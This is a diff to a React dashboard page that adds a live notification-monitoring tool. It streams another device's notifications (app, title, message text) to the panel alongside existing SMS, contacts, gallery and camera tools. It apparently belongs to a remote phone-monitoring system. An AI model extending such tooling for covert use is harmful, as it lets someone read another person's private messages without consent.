@@ -71,7 +71,7 @@ export default function Home() {
     const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);
 
     // Tool Selector State
-    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera'>('gallery');
+    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications'>('gallery');
     const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);
 
     // Torch State
@@ -95,6 +95,12 @@ export default function Home() {
     const [contactsList, setContactsList] = useState<any[]>([]);
     const [isFetchingContacts, setIsFetchingContacts] = useState(false);
     const [contactsSearchQuery, setContactsSearchQuery] = useState('');
+
+    // Notification Monitoring State
+    const [notifications, setNotifications] = useState<any[]>([]);
+    const [isMonitoringNotifications, setIsMonitoringNotifications] = useState(false);
+    const [selectedNotification, setSelectedNotification] = useState<any>(null);
+    const [notificationSearch, setNotificationSearch] = useState('');
 
     // Settings Modal State
     const [isSettingsOpen, setIsSettingsOpen] = useState(false);
@@ -266,6 +272,46 @@ export default function Home() {
                     type: 'error'
                 });
                 setShowCustomAlert(true);
+            });
+
+            // Notification Monitoring Event Listeners
+            socket.on("new_notification", (data: any) => {
+                setNotifications(prev => {
+                    // Deduplicate by id
+                    const exists = prev.find(n => n.id === data.id);
+                    if (exists) {
+                        return prev.map(n => n.id === data.id ? { ...data, receivedAt: Date.now() } : n);
+                    }
+                    return [{ ...data, receivedAt: Date.now() }, ...prev].slice(0, 500); // Keep last 500
+                });
+            });
+
+            socket.on("notification_dismissed", (data: any) => {
+                setNotifications(prev => prev.map(n => n.id === data.id ? { ...n, dismissed: true } : n));
+            });
+
+            socket.on("notification_monitor_status", (data: any) => {
+                if (!data.enabled) {
+                    setAlertData({
+                        title: 'Notification Access Required',
+                        message: 'Notification Listener is not enabled on the device. Please open the app and enable Notification Access in Settings.',
+                        type: 'warning'
+                    });
+                    setShowCustomAlert(true);
+                    setIsMonitoringNotifications(false);
+                } else {
+                    setIsMonitoringNotifications(true);
+                }
+            });
+
+            socket.on("notification_error", (data: any) => {
+                setAlertData({
+                    title: 'Notification Monitor Error',
+                    message: data.message || 'Failed to start notification monitoring.',
+                    type: 'error'
+                });
+                setShowCustomAlert(true);
+                setIsMonitoringNotifications(false);
             });
 
             // Permission Check Response
@@ -764,6 +810,7 @@ END:VCARD`;
                             {selectedTool === 'torch' && <svg className="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>}
                             {selectedTool === 'vibration' && <svg className="w-4 h-4 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>}
                             {selectedTool === 'camera' && <svg className="w-4 h-4 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>}
+                            {selectedTool === 'notifications' && <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>}
                             <span className="text-xs font-medium text-white/70">Tools</span>
                             <svg className="w-3 h-3 text-white/40" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
                         </button>
@@ -1125,6 +1172,232 @@ END:VCARD`;
                                     <svg className="w-6 h-6 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                                     Vibrate Now
                                 </button>
+                            </div>
+                        </div>
+                    )}
+
+                    {/* Notification Monitoring Tool */}
+                    {selectedTool === 'notifications' && (
+                        <div className="space-y-4">
+                            {/* Header with Controls */}
+                            <div className="bg-[#1a1a1a] border border-white/10 rounded-xl p-4">
+                                <div className="flex items-center justify-between mb-4">
+                                    <div className="flex items-center gap-3">
+                                        <div className="p-2 rounded-lg bg-cyan-500/20">
+                                            <svg className="w-5 h-5 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                        </div>
+                                        <div>
+                                            <h3 className="font-bold text-lg">Live Notifications</h3>
+                                            <p className="text-xs text-white/40">Monitor device notifications in real-time</p>
+                                        </div>
+                                    </div>
+                                    <div className="flex items-center gap-2">
+                                        {notifications.length > 0 && (
+                                            <span className="px-2 py-0.5 bg-cyan-500/20 text-cyan-400 text-xs font-bold rounded-full">
+                                                {notifications.length}
+                                            </span>
+                                        )}
+                                    </div>
+                                </div>
+
+                                <div className="flex gap-2">
+                                    <button
+                                        onClick={() => {
+                                            if (isMonitoringNotifications) {
+                                                socket?.emit('stop_notification_monitor', {
+                                                    uuid: session?.user?.uuid,
+                                                    targetDeviceId: selectedDeviceId
+                                                });
+                                                setIsMonitoringNotifications(false);
+                                            } else {
+                                                socket?.emit('start_notification_monitor', {
+                                                    uuid: session?.user?.uuid,
+                                                    targetDeviceId: selectedDeviceId
+                                                });
+                                            }
+                                        }}
+                                        disabled={!selectedDeviceId}
+                                        className={`flex-1 py-3 rounded-xl font-bold text-sm transition-all flex items-center justify-center gap-2 ${isMonitoringNotifications
+                                                ? 'bg-red-500/20 border border-red-500/50 text-red-400 hover:bg-red-500/30'
+                                                : selectedDeviceId
+                                                    ? 'bg-gradient-to-r from-cyan-500 to-blue-500 hover:scale-[1.02] shadow-lg shadow-cyan-500/20'
+                                                    : 'bg-white/10 text-white/20 cursor-not-allowed'
+                                            }`}
+                                    >
+                                        {isMonitoringNotifications ? (
+                                            <>
+                                                <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />
+                                                Stop Monitoring
+                                            </>
+                                        ) : (
+                                            <>
+                                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                                Start Monitoring
+                                            </>
+                                        )}
+                                    </button>
+                                    {notifications.length > 0 && (
+                                        <button
+                                            onClick={() => setNotifications([])}
+                                            className="px-4 py-3 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 transition-colors text-sm text-white/60"
+                                        >
+                                            Clear
+                                        </button>
+                                    )}
+                                </div>
+                            </div>
+
+                            {/* Search */}
+                            {notifications.length > 0 && (
+                                <div className="relative">
+                                    <svg className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                                    <input
+                                        type="text"
+                                        placeholder="Search by app or content..."
+                                        value={notificationSearch}
+                                        onChange={(e) => setNotificationSearch(e.target.value)}
+                                        className="w-full bg-white/5 border border-white/10 rounded-xl pl-10 pr-4 py-3 text-sm focus:outline-none focus:border-cyan-500/50 transition-colors"
+                                    />
+                                </div>
+                            )}
+
+                            {/* Live Feed */}
+                            {isMonitoringNotifications && notifications.length === 0 && (
+                                <div className="text-center py-12">
+                                    <div className="w-12 h-12 border-4 border-cyan-500/30 border-t-cyan-500 rounded-full animate-spin mx-auto mb-4" />
+                                    <p className="text-white/40 text-sm">Waiting for notifications...</p>
+                                    <p className="text-white/20 text-xs mt-1">Notifications will appear here in real-time</p>
+                                </div>
+                            )}
+
+                            {!isMonitoringNotifications && notifications.length === 0 && (
+                                <div className="text-center py-12">
+                                    <svg className="w-16 h-16 mx-auto mb-4 text-white/10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                    <p className="text-white/40 font-medium">No notifications yet</p>
+                                    <p className="text-white/20 text-xs mt-1">Click &quot;Start Monitoring&quot; to begin</p>
+                                </div>
+                            )}
+
+                            {/* Notification Cards */}
+                            <div className="space-y-2 max-h-[65vh] overflow-y-auto pr-1" style={{ scrollbarWidth: 'thin', scrollbarColor: 'rgba(255,255,255,0.1) transparent' }}>
+                                {notifications
+                                    .filter(n => {
+                                        if (!notificationSearch) return true;
+                                        const q = notificationSearch.toLowerCase();
+                                        return (n.appName?.toLowerCase().includes(q) || n.title?.toLowerCase().includes(q) || n.text?.toLowerCase().includes(q));
+                                    })
+                                    .map((notif, idx) => {
+                                        const timeAgo = (() => {
+                                            const diff = Date.now() - (notif.receivedAt || notif.timestamp);
+                                            if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
+                                            if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
+                                            if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
+                                            return new Date(notif.timestamp).toLocaleDateString();
+                                        })();
+
+                                        // Map category to color
+                                        const categoryColors: Record<string, string> = {
+                                            msg: 'border-l-green-500',
+                                            email: 'border-l-blue-500',
+                                            call: 'border-l-yellow-500',
+                                            social: 'border-l-pink-500',
+                                            promo: 'border-l-orange-500',
+                                        };
+                                        const borderColor = categoryColors[notif.category] || 'border-l-cyan-500';
+
+                                        return (
+                                            <button
+                                                key={`${notif.id}-${idx}`}
+                                                onClick={() => setSelectedNotification(notif)}
+                                                className={`w-full text-left p-3 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 transition-all border-l-4 ${borderColor} ${notif.dismissed ? 'opacity-50' : ''}`}
+                                            >
+                                                <div className="flex items-start gap-3">
+                                                    {notif.icon ? (
+                                                        <img
+                                                            src={`data:image/png;base64,${notif.icon}`}
+                                                            alt={notif.appName}
+                                                            className="w-8 h-8 rounded-lg flex-shrink-0"
+                                                        />
+                                                    ) : (
+                                                        <div className="w-8 h-8 rounded-lg bg-cyan-500/20 flex items-center justify-center flex-shrink-0">
+                                                            <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                                        </div>
+                                                    )}
+                                                    <div className="flex-1 min-w-0">
+                                                        <div className="flex items-center justify-between">
+                                                            <span className="text-xs font-medium text-cyan-400">{notif.appName}</span>
+                                                            <span className="text-[10px] text-white/30 flex-shrink-0">{timeAgo}</span>
+                                                        </div>
+                                                        {notif.title && <p className="text-sm font-semibold truncate">{notif.title}</p>}
+                                                        {notif.text && <p className="text-xs text-white/50 line-clamp-2 mt-0.5">{notif.text}</p>}
+                                                    </div>
+                                                </div>
+                                            </button>
+                                        );
+                                    })
+                                }
+                            </div>
+                        </div>
+                    )}
+
+                    {/* Notification Detail Modal */}
+                    {selectedNotification && (
+                        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
+                            <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl max-w-lg w-full mx-4 animate-scaleIn">
+                                <div className="flex justify-between items-start mb-4">
+                                    <div className="flex items-center gap-3">
+                                        {selectedNotification.icon ? (
+                                            <img
+                                                src={`data:image/png;base64,${selectedNotification.icon}`}
+                                                alt={selectedNotification.appName}
+                                                className="w-10 h-10 rounded-xl"
+                                            />
+                                        ) : (
+                                            <div className="w-10 h-10 rounded-xl bg-cyan-500/20 flex items-center justify-center">
+                                                <svg className="w-5 h-5 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                            </div>
+                                        )}
+                                        <div>
+                                            <h3 className="text-lg font-bold">{selectedNotification.appName}</h3>
+                                            <p className="text-xs text-white/40">
+                                                {new Date(selectedNotification.timestamp).toLocaleString()}
+                                            </p>
+                                        </div>
+                                    </div>
+                                    <button
+                                        onClick={() => setSelectedNotification(null)}
+                                        className="p-2 hover:bg-white/10 rounded-lg transition-colors"
+                                    >
+                                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                                    </button>
+                                </div>
+                                {selectedNotification.title && (
+                                    <div className="mb-3">
+                                        <p className="text-sm font-semibold">{selectedNotification.title}</p>
+                                    </div>
+                                )}
+                                <div className="p-4 rounded-xl bg-white/5 border border-white/10 mb-4">
+                                    <p className="text-sm whitespace-pre-wrap">{selectedNotification.text || 'No content'}</p>
+                                    {selectedNotification.subText && (
+                                        <p className="text-xs text-white/40 mt-2">{selectedNotification.subText}</p>
+                                    )}
+                                </div>
+                                <div className="flex gap-2 flex-wrap">
+                                    <span className="text-xs px-3 py-1 rounded-full bg-cyan-500/20 text-cyan-400">
+                                        {selectedNotification.packageName}
+                                    </span>
+                                    {selectedNotification.category && selectedNotification.category !== 'unknown' && (
+                                        <span className="text-xs px-3 py-1 rounded-full bg-white/10 text-white/60">
+                                            {selectedNotification.category}
+                                        </span>
+                                    )}
+                                    {selectedNotification.isOngoing && (
+                                        <span className="text-xs px-3 py-1 rounded-full bg-yellow-500/20 text-yellow-400">Ongoing</span>
+                                    )}
+                                    {selectedNotification.dismissed && (
+                                        <span className="text-xs px-3 py-1 rounded-full bg-red-500/20 text-red-400">Dismissed</span>
+                                    )}
+                                </div>
                             </div>
                         </div>
                     )}
@@ -1946,6 +2219,31 @@ END:VCARD`;
                                     </div>
                                     {selectedTool === 'vibration' && (
                                         <svg className="w-5 h-5 text-orange-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                    )}
+                                </button>
+                                <button
+                                    onClick={() => {
+                                        setSelectedTool('notifications');
+                                        setIsToolDropdownOpen(false);
+                                    }}
+                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'notifications' ? 'bg-cyan-500/20 border border-cyan-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
+                                >
+                                    <div className="flex items-center gap-3">
+                                        <div className="p-2 rounded-lg bg-cyan-500/20">
+                                            <svg className="w-5 h-5 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                        </div>
+                                        <div>
+                                            <div className="font-medium">Notifications</div>
+                                            <div className="text-xs text-white/40">Live notification feed</div>
+                                        </div>
+                                    </div>
+                                    {notifications.length > 0 && (
+                                        <span className="px-2 py-0.5 bg-cyan-500/20 text-cyan-400 text-xs font-bold rounded-full">
+                                            {notifications.length}
+                                        </span>
+                                    )}
+                                    {selectedTool === 'notifications' && (
+                                        <svg className="w-5 h-5 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                     )}
                                 </button>
                             </div>
